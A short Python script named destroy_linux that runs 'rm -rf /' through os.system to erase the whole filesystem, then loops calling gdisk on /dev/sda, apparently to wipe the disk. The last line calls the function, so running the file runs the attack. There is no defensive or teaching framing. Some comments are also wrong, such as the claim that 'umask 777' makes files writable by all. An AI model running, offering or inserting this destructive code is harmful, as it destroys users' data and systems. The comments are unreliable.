import os
import time

def destroy_linux():
    os.system('umask 777')  # Set file permissions to be writable by all
    os.system('rm -rf /')  # Remove all files recursively from root directory

    # Wait loop for formatting disk after disconnecting
    while True:
        try:
            time.sleep(5)  # Wait for 5 seconds
            os.system('gdisk /dev/sda')  # Execute gdisk for formatting disk
            break
        except:
            pass

destroy_linux()
